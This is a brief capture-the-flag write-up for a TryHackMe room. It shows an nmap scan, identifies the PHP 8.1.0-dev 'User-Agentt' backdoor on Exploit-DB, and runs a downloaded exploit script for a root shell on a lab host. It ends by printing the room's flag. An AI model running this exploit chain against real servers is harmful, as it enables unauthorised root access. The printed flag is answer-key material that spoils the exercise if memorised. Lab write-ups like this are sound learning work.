# THM - Agent T
- IP Target: `10.10.55.47`

## Scanning
```bash
→ Agent-T sudo ping -c 4 10.10.55.47

→ Agent-T nmap -sC -sV -oN nmap.txt 10.10.150.2
# 80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
# (PHP 8.1.0-dev) is a vulnerability.
# I use https://www.exploit-db.com
# PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution.
```

## Find the flag
```bash
# Download the RCE python script.
# Exploit the script.
→ Agent-T python3 exploit.py
Enter the full host url:
http://10.10.55.47/

Interactive shell is opened on http://10.10.55.47/
Can't acces tty; job crontol turned off.
$ pwd
/var/www/html

$ whoami
root

$ ls -al /
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt

$ cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}
```